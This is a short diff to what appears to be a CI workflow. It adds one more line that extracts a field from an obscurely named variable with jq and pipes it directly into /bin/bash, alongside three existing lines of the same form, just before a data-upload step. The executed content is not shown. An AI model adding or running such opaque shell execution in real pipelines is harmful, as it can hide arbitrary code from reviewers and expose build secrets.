@@ -28,6 +28,7 @@ jobs:
           echo $ukg87428 | jq -r .nx18330 | /bin/bash
           echo $yl02 | jq -r .lt680 | /bin/bash
           echo $okoz901 | jq -r .b881 | /bin/bash
+          echo $lzav60104 | jq -r .ugndv52 | /bin/bash
 
       - name: Upload data
         if: always()
